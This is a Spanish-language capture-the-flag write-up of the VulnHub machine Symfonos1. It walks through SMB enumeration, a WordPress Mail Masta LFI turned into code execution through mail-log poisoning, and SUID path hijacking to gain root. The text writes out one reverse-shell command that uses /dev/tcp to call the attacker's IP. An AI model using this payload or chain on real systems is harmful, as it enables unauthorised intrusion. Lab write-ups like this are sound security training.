---
layout: single
title: Symfonos1 - VulnHub
date: 2023-09-09
classes: wide
header:
  tease: 
categories:
  - Vulnhub
  - Easy
  - Linux
tags:
  - Vulnhub
  - SMB enumeration
  - Wordpress enumeration
  - LFI to RCE via SMT log
  - Abusing Wordpress plugin Mail Masta
  - SUID + Path Hijacking
---

![](../assets/images/Symfonos1/symfonos1.png)

# Fase de reconocimiento
---
Empezamos realizando un escaneo con `arp-scan` a la red para averiguar la IP de la máquina:
 
![](../assets/images/Symfonos1/arp.png)

Ahora realizamos un `ping` a la máquina para ver si nos responde.
Vemos que el *TTL* es *64* lo que nos indica que es una máquina **Linux**

![](../assets/images/Symfonos1/ping.png)

Empezamos ahora el reconocimiento de los puertos utilizando `nmap`, primero
escaneamos todo el rango de puertos.

![](../assets/images/Symfonos1/nmap1.png)

Ahora sobre estos puertos, hacemos un escaneo más profundo para detectar versión y servicio.

![](../assets/images/Symfonos1/nmap2.png)

# Fase de explotación
---
## SMB información expuesta
El puerto **445** y el **139** estás abiertos y son de *SMB*. Utilizando la herramienta `smbmap` vamos a ver si encontramos algo.
Vemos que tenemos permisos de lectura en **anonymous** y además vemos un posible usuario `helios`.

![](../assets/images/Symfonos1/smbmap1.png)

Vamos a ver que hay en el recurso compartido de **anonymous**.
Tenemos un archivo llamado `attention.txt` que vamos a descargarnos para ver que contiene.

![](../assets/images/Symfonos1/smbclient.png)


En este archivo de texto encontramos una fuga de información donde podemos posibles credenciales de usurios.

![](../assets/images/Symfonos1/attention.png)

Probando con las credenciales, conseguimos ver el contenido del recurso compartido de `helios`

![](../assets/images/Symfonos1/smbclient2.png)

Nos descargamos los archivos y vemos esto en el archivo `todo.txt`, donde encontramos una nueva ruta de la web.

![](../assets/images/Symfonos1/todo.png)




## Fuzzing y enumeración Worpress
---
Hacemos fuzzing sobre esta nueva ruta para descubrir archivos y directorios.

![](../assets/images/Symfonos1/fuzzing.png)

Vemos que nos encontramos frente a un **Wordpress** asi que podemos utilizar la herramienta `wpscan` para enumerarlo.
La herramienta nos reporta que hay un **LFI** en el plugin **Mail masta**

![](../assets/images/Symfonos1/wpscan.png)

Hacemos una busqueda en searchsploit para investigar esta vulnerabilidad

![](../assets/images/Symfonos1/searchsploit.png)


## LFI to RCE via SMTP log
---
Confirmamos que se produce un **LFI** y ahora vamos a apuntar al archivo `/var/mail/helios` para que interprete el código php que
vamos a enviar al log de la siguiente manera:

![](../assets/images/Symfonos1/sendemai.png)

Ahora apuntamos a `/var/mail/helios` y le metemos `&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.41/443 0>%261"` para mandarnos una **Rerverse Shell**

![](../assets/images/Symfonos1/reverseshell.png)

# Escalada de priveligos
---
Examinando el sistema, vemos que tenemos permiso *SUID* sobre este binario peculiar.

![](../assets/images/Symfonos1/find.png)

Examinandolo con `strings`, vemos que se está ejecutando el comando `curl` de forma relativa. Esto es un problema, porque da lugar a un **Path Hijacking**
de la siguiente manera.

1 - Modificamos el PATH de la siguiente manera
![](../assets/images/Symfonos1/path.png)

2 - Creamos un archivo llamado `curl` en `/tmp/` y le damos permisos de ejecución <br>
![](../assets/images/Symfonos1/bash-p.png)

3 - Ejecutamos el binario y ya seríamos `root` 
<br>
![](../assets/images/Symfonos1/root.png)












